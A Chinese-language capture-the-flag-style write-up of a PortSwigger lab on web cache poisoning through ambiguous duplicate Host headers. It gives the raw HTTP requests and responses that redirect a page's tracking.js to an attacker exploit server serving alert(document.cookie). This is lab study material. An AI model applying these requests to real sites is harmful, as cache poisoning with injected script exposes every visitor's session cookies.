

## 通过 Host 头进行 Web 缓存中毒
实验：通过模糊请求进行 Web 缓存投毒
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests

**若开启扩展的缓存破坏，进行缓存中毒时需关闭**
设置两个Host头时：
GET / HTTP/1.1
Host: 6krr70x6fxe062765qqwy1lqjhp8d01p.oastify.com
Host: 0a0300b2034e8126830fd235006200cc.h1-web-security-academy.net
响应
Server Error: Gateway Timeout (1) connecting to 6krr70x6fxe062765qqwy1lqjhp8d01p.oastify.com
服务器对多个Host头不报错，且尝试连接第一个Host头

调换顺序
GET / HTTP/1.1
Host: 0a0300b2034e8126830fd235006200cc.h1-web-security-academy.net
Host: 6krr70x6fxe062765qqwy1lqjhp8d01p.oastify.com
响应为
```html
<script type="text/javascript" src="//6krr70x6fxe062765qqwy1lqjhp8d01p.oastify.com/resources/js/tracking.js"></script>
```
第二个Host头注入到了加载的js脚本中
设置控制网页内容为
alert(document.cookie)
设置控制页面路径为
/resources/js/tracking.js

设置头部为
GET / HTTP/1.1
Host: 0a0300b2034e8126830fd235006200cc.h1-web-security-academy.net
Host: exploit-0a4300cf03fd81868344d12701c0005f.exploit-server.net

